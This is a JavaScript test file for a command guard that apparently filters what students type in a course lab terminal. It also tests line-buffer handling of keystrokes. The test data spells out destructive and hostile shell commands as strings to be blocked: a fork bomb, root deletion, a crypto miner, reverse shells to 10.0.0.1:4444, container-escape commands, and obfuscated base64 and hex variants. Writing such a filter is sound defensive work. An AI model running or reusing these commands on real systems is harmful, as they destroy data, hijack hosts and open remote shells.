const commandGuard = require('../lib/commandGuard');
const units = require('../lib/units');

const { check, LineBuffer } = commandGuard;

describe('commandGuard.check', () => {
  test.each([
    [':(){ :|:& };:', 'fork_bomb'],
    [':() { : | : & } ; :', 'fork_bomb'],
    ['bomb(){ bomb|bomb& };bomb', 'fork_bomb'],
    ['rm -rf /', 'root_delete'],
    ['rm -rf /*', 'root_delete'],
    ['sudo rm -fr / ', 'root_delete'],
    ['rm -rf --no-preserve-root /', 'root_delete'],
    ['dd if=/dev/zero of=/home/student/fill', 'disk_fill'],
    ['./xmrig -o pool.example:3333', 'crypto_miner'],
    ['miner -o stratum+tcp://pool.example:3333', 'crypto_miner'],
    ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'reverse_shell'],
    ['nc -e /bin/sh 10.0.0.1 4444', 'reverse_shell'],
    ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f', 'reverse_shell'],
    ['curl --unix-socket /var/run/docker.sock http://x/containers/json', 'host_escape'],
    ['nsenter -t 1 -m -u -i -n sh', 'host_escape'],
    ['mount -t proc proc /mnt', 'host_escape'],
    ['echo c > /proc/sysrq-trigger', 'host_escape'],
  ])('blocks %s', (command, rule) => {
    expect(check(command)).toMatchObject({ blocked: true, rule });
  });

  test.each([
    'ls -la',
    'rm -rf ./build',
    'rm -rf /home/student/webapp',
    'rm -f /tmp/old.log',
    'dd if=/dev/zero of=test.img bs=1M count=10',
    'docker run -d -p 8080:80 nginx',
    'git commit -m "remove the / prefix"',
    'nc -zv localhost 8080',
    'mount | grep home',
    'echo "c29tZSBoYXJtbGVzcyB0ZXh0IGhlcmU=" | base64 -d',
    '',
    '   ',
  ])('allows %s', (command) => {
    expect(check(command).blocked).toBe(false);
  });

  test('sees through base64 encoding', () => {
    const payload = Buffer.from('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1').toString('base64');
    expect(check(`echo ${payload} | base64 -d | sh`)).toEqual({ blocked: true, rule: 'reverse_shell', deobfuscated: true });
  });

  test('sees through \\x hex escapes', () => {
    const hex = [...'rm -rf /'].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
    expect(check(`printf '${hex}' | sh`)).toMatchObject({ blocked: true, rule: 'root_delete', deobfuscated: true });
  });

  test('does not flag any command taught in the course labs', () => {
    const flagged = [];
    for (const meta of units.listMeta()) {
      for (const step of units.getSteps(meta.id)) {
        const text = [step.description, ...(step.tasks || [])].join('\n');
        for (const match of text.matchAll(/`([^`]+)`/g)) {
          const verdict = check(match[1]);
          if (verdict.blocked) flagged.push(`${meta.id} step ${step.step}: ${match[1]} (${verdict.rule})`);
        }
      }
    }
    expect(flagged).toEqual([]);
  });
});

describe('LineBuffer', () => {
  function lines(buffer, input) {
    return buffer.push(input).filter((part) => part.line !== undefined).map((part) => part.line);
  }

  test('passes keystrokes through and reports the line on Enter', () => {
    const buffer = new LineBuffer();
    expect(buffer.push('ls')).toEqual([{ data: 'ls' }]);
    expect(buffer.push(' -la\r')).toEqual([{ data: ' -la' }, { line: 'ls -la', terminator: '\r' }]);
  });

  test('applies backspace, Ctrl-U and Ctrl-C', () => {
    const buffer = new LineBuffer();
    expect(lines(buffer, 'lss\x7f -l\r')).toEqual(['ls -l']);
    expect(lines(buffer, 'rm -rf /\x15pwd\r')).toEqual(['pwd']);
    expect(lines(buffer, 'sleep 100\x03date\r')).toEqual(['date']);
  });

  test('ignores arrow keys and other escape sequences', () => {
    const buffer = new LineBuffer();
    expect(lines(buffer, 'ec\x1b[Dho\x1b[1;5C hi\x1bOA\r')).toEqual(['echo hi']);
  });

  test('splits a multi-line paste into separate lines', () => {
    const buffer = new LineBuffer();
    expect(lines(buffer, 'mkdir a\ncd a\rpwd')).toEqual(['mkdir a', 'cd a']);
    expect(lines(buffer, '\r')).toEqual(['pwd']);
  });

  test('forwards every byte except the line terminators', () => {
    const buffer = new LineBuffer();
    const input = 'a\x1b[Ab\x7fc\rd';
    const forwarded = buffer.push(input).map((part) => part.data ?? part.terminator).join('');
    expect(forwarded).toBe(input);
  });

  test('caps the remembered line length', () => {
    const buffer = new LineBuffer(8);
    expect(lines(buffer, `${'x'.repeat(50)}\r`)).toEqual(['x'.repeat(8)]);
  });
});
